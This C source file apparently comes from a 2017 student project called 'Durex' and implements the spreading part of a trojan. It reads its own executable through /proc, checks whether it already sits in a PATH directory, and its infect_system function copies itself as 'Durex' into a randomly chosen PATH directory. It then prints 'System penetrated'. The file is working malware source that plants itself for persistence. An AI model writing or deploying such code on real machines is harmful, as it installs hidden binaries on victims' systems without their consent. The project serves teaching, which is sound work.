/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/10/16 22:41:40 by frmarinh          #+#    #+#             */
/*   Updated: 2017/10/16 22:41:48 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

/*
**	Return the path of the current executable
*/
static char				*get_current_path()
{
    char arg1[20];
    char exe_path[PATH_MAX + 1] = { 0 };

    sprintf(arg1, "/proc/%d/exe", getpid());
    readlink(arg1, exe_path, 1024);
    return ft_strdup(exe_path);
}

/*
**	Is the executable in a binary path from env values ?
*/
bool					is_in_binary_path(t_durex *durex)
{
	t_env		*path	= find_env_key(durex, "PATH");
	int			i		= 0;

	if (path) {
		char		**dirs	= ft_strsplit(path->value, ':');
		while (dirs[i]) {
			if (ft_strstr(durex->current_path, dirs[i++])) {
				return (true);
			}
		}
	}
	return (false);
}

/*
**	Get durex struct
*/
t_durex					*get_durex(char **env, int taste)
{
	t_durex		*durex = NULL;

	if (!(durex = (t_durex*)malloc(sizeof(struct s_durex)))) {
		return (NULL);
	}
	durex->env = get_env(env);
	durex->current_path = get_current_path();
	return (durex);
}

/*
**	Getting the current executable content
*/
static void				get_durex_content(t_durex *durex)
{
	int		fd	= open(durex->current_path, O_RDONLY);
	if (fd > 0) {
		if ((durex->length = get_file_length(durex->current_path)) > 0) {
			if (!(durex->content = (char*)malloc(sizeof(char) * durex->length))) {
				return;
			}
			read(fd, durex->content, durex->length);
		}
		close(fd);
	}
}

/*
**	Infect the system
*/
void					infect_system(t_durex *durex)
{
	t_env		*path			= find_env_key(durex, "PATH");
	int			fd				= 0;
	if (path) {
		char		**dirs			= ft_strsplit(path->value, ':');
		char		*chosen_path	= dirs[get_random(0, (ft_array_len(dirs) - 1))];
		chosen_path = ft_strjoin(chosen_path, "/Durex");

		unlink(chosen_path);
		get_durex_content(durex);
		if ((fd = open(chosen_path, O_RDWR | O_CREAT)) > 0) {
			write(fd, durex->content, durex->length);
			printf("System penetrated in %s (using a durex) - frmarinh/rjaguin\n", chosen_path);
			close(fd);
		}
	}
}
